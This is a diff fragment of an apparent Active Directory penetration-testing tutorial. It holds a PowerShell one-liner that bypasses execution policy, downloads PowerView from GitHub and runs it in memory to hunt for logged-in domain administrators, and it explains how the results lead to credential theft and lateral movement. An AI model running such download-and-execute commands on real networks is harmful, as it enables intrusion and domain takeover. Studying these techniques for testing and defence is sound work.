@@ -2,7 +2,7 @@ Hunt out any machines were an account belonging to the domain administrative gro
 
 PS C:\Users\Gimmyt> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-UserHunter -CheckAccess"
 
-The results can be seen in the below response which details that users belonging to the DA group are presently authenticated on the following two machines IP address 192.168.10.69 and 192.168.10.47, and it lists the machines IP address that the sessions originated from, possibly indicating RDP session or some form of remote access. So, if you can get admin access to any of those four IP addresses and you can reveal the user’s passwords you just got an account belonging to the DA group. Furthermore, the result also reveals if your account has local admin access on the revealed IP address that the DA was identified on, if it said True you would be able to laterally move to the machines.
+The results as can be seen directly below details the presently authenticated users who belonging to the DA group and the IP address of the machine, they are authenticated to, it also lists the originators sessions IP address. If you can gain access to any of those machines with local admin level privileges you will be able to gain access to those domain accounts. Furthermore, the result also reveals if your account has local admin access on the revealed IP address, if it said True you would be able to laterally move to the machines.
 
 UserDomain   : space.hopper
 UserName     : Administrator
